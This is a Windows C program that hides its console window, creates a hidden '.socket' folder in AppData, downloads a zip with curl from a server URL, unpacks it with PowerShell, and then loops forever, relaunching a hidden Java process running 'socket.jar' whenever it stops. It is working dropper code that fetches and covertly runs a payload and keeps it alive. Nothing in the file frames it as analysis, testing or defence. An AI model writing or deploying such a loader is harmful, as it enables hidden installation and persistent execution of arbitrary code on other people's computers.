#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include <stdlib.h>
#include <tlhelp32.h>

int isProcessRunning(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnap, &pe)) {
        CloseHandle(hSnap);
        return 0;
    }

    do {
        if (strcmp(processName, pe.szExeFile) == 0) {
            CloseHandle(hSnap);
            return 1;
        }
    } while (Process32Next(hSnap, &pe));

    CloseHandle(hSnap);
    return 0;
}

int main() {
    char appDataPath[MAX_PATH];
    char socketFolderPath[MAX_PATH];
    char curlCommand[512];
    char unzipCommand[512];
    char runJarCommand[512];
    DWORD dwAttrib;

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        snprintf(socketFolderPath, sizeof(socketFolderPath), "%s\\.socket", appDataPath);
        dwAttrib = GetFileAttributesA(socketFolderPath);

        if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
            if (CreateDirectoryA(socketFolderPath, NULL)) {
                SetFileAttributesA(socketFolderPath, FILE_ATTRIBUTE_HIDDEN);
            }
            else {
                return 1;
            }
        }

        snprintf(curlCommand, sizeof(curlCommand), "curl.exe -o %s\\java.zip http://127.0.0.1/java.zip", socketFolderPath);
        if (system(curlCommand) != 0) {
            return 1;
        }

        Sleep(10000);

        snprintf(unzipCommand, sizeof(unzipCommand), "powershell.exe -Command \"Expand-Archive -Path %s\\java.zip -DestinationPath %s\"", socketFolderPath, socketFolderPath);
        if (system(unzipCommand) != 0) {
            return 1;
        }

        Sleep(10000);

        while (1) {
            if (!isProcessRunning("java.exe")) {
                snprintf(runJarCommand, sizeof(runJarCommand), "powershell.exe -WindowStyle Hidden -Command \"Start-Process -WindowStyle Hidden -FilePath '%s\\\\.socket\\\\jre\\\\bin\\\\java.exe' -ArgumentList '-jar','%s\\\\.socket\\\\socket.jar'\"", appDataPath, appDataPath);
                if (system(runJarCommand) != 0) {
                    return 1;
                }
            }
            Sleep(5000); 
        }

    }
    else {
        return 1;
    }

    return 0;
}
